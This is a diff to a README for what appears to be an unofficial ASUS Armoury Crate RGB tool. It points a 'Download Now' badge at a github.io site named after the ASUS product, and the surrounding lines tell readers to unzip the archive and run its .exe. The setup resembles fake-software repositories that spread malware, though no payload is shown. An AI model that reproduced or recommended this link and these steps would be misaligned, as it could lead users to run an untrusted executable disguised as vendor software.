@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://asus-armoury-crate.github.io/.github/)
 
 ## 📸 Overview
 ![asus-armoury-rgb](https://github.com/user-attachments/assets/9d7f94eb-4d48-4df0-9c7d-a834af7836fa)
